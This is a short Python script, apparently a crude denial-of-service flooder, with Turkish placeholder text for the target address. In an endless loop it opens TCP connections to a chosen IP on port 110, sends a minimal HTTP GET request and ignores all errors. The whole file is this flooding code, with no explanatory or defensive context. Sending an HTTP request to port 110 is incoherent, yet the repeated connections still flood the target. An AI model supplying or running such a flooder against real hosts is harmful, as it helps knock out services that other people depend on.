import socket

target_ip = "hedef_ip_adresi"
target_port = 110

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        sock.sendto(b"GET / HTTP/1.1\r\n",(target_ip, target_port))
        sock.sendto(b"Host: " + target_ip.encode() + b"\r\n\r\n", (target_ip, target_port))
        print("Paket gönderildi!")
    except:
        print("Bağlantı hatası!")
    finally:
        sock.close()